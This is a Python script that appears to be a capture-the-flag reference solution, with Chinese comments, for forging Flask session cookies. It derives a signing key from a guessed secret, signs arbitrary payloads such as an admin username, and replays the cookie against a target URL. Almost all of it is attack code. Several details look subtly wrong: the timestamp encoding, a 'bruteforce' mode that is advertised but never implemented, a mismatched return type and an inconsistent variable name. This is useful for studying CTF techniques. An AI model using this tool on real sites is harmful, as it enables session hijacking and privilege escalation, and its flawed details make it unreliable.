"""
reference_solve.py — Flask session cookie 伪造 (零依赖, 纯标准库)

Flask session cookie 格式: base64url(json_payload).timestamp.signature
signature = HMAC-SHA1(derived_key, base64url(json_payload).timestamp)
derived_key = HMAC-SHA1(secret_key, salt='cookie-session')   # Flask 默认 salt + key_derivation='hmac'
payload 用 TaggedJSONSerializer: json.dumps(..., separators=(",", ":")) 紧凑模式

用法:
  python3 reference_solve.py forge <secret> '{"username":"admin"}'   # 伪造一个 cookie
  python3 reference_solve.py bruteforce <wordlist> <url>             # 爆破 secret + 验证

如果目标改了 salt (非默认), 用 forge 时改 _salt 变量重试 (可试 '' / 'flask' / 应用名等)。
"""
import base64, hashlib, hmac, json, sys, time, urllib.request

_SALT = b"cookie-session"  # Flask 默认 salt

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def derive_key(secret: str) -> bytes:
    # Flask key_derivation='hmac': HMAC(secret_key, salt)
    return hmac.new(secret.encode(), _SALT, hashlib.sha1).digest()

def sign(secret: str, payload: dict, timestamp: int = None) -> str:
    ts = str(timestamp or int(time.time()))
    raw = b64url(json.dumps(payload, separators=(",", ":")).encode()) + "." + ts
    dk = derive_key(secret)
    sig = hmac.new(dk, raw.encode(), hashlib.sha1).digest()
    return raw + "." + b64url(sig)

def forge(secret: str, payload: dict) -> str:
    return sign(secret, payload)

def test_cookie(url: str, cookie: str) -> int:
    req = urllib.request.Request(url, headers={"Cookie": "session=" + cookie})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, dict(r.headers).get("Location", "")
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("Location", "")

if __name__ == "__main__":
    if sys.argv[1] == "forge":
        secret, payload = sys.argv[2], json.loads(sys.argv[3])
        print(forge(secret, payload))
